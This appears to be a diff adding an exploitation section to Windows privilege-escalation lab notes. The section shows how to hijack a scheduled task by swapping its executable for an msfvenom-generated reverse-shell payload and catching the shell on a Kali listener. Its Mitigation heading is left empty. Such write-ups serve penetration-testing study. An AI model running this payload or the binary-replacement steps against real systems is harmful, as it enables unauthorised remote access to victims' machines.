@@ -417,6 +417,30 @@ Outcome:
 
 #### Exploitaion
 
+1) Use msfvenom to generate a malicious executable (exe) file that can be executed via the 'MagicTask' scheduled task:
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp lhost=eth0 lport=1234 -f exe > shell.exe
+```
+
+2) Transfer the malicious executable file to victim's machine.
+
+3) Move the malicious executable file to 'C:\Jobs'.
+
+4) Rename the 'Monitor_AMD64.exe' to 'Monitor_AMD64.bak'.
+
+5) Rename the malicious exe (shell.exe) to 'Monitor_AMD64.exe'.
+
+Outcome:
+
+![Task-Scheduler-All-Above-Actions](/Pictures/Taskscheduler-10.png)
+
+6) Open a listener on your Kali machine.
+
+7) Wait five minutes and verify the reverse shell on your Kali machine:
+
+![Task-Scheduler-Verify-Reverse-Shell](/Pictures/Taskscheduler-11.png)
+
 #### Mitigation
 
 ### SeBackupPrivilege
